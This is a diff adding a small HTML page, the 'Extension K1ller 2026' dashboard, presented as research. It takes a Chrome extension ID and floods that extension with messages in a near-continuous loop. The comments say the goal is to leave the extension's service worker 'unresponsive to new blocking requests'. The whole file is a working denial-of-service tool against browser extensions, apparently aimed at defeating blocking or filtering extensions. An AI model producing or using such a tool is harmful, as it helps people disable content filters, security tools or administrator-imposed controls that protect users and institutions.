@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Extension Research Dashboard</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 50px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #333; display: inline-block; }
+        input { padding: 10px; border-radius: 5px; border: none; width: 250px; margin-bottom: 10px; }
+        button { padding: 10px 20px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; }
+        #start { background: #ff4b2b; color: white; }
+        #stop { background: #555; color: white; }
+        .status { margin-top: 15px; color: #aaa; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Extension K1ller 2026</h2>
+        <p>Enter the Extension ID to simulate a "Hang" state.</p>
+        
+        <input type="text" id="targetId" placeholder="e.g. gppongoncljclononidajonodcljclon"><br>
+        
+        <button id="start" onclick="toggleHang(true)">START HANG</button>
+        <button id="stop" onclick="toggleHang(false)">STOP</button>
+
+        <div class="status" id="status">Status: Ready</div>
+    </div>
+
+    <script>
+        let hanging = false;
+
+        async function toggleHang(state) {
+            const id = document.getElementById('targetId').value;
+            const status = document.getElementById('status');
+
+            if (!id || id.length < 20) {
+                alert("Please enter a valid Extension ID.");
+                return;
+            }
+
+            hanging = state;
+            
+            if (hanging) {
+                status.innerText = "Status: Hanging " + id + "...";
+                status.style.color = "#ff4b2b";
+                
+                // The "Hang" Loop
+                while (hanging) {
+                    try {
+                        // We use the filesystem or messaging API to flood the target
+                        // This causes the extension's service worker to stay "Active" 
+                        // but unresponsive to new blocking requests.
+                        chrome.runtime.sendMessage(id, { type: "RE_AUTH_PING" }, () => {
+                            if (chrome.runtime.lastError) { /* Expected failure */ }
+                        });
+                    } catch (e) {}
+                    
+                    // Small delay to prevent crashing YOUR tab
+                    await new Promise(r => setTimeout(r, 1)); 
+                }
+            } else {
+                status.innerText = "Status: Stopped";
+                status.style.color = "#aaa";
+            }
+        }
+    </script>
+</body>
+</html>
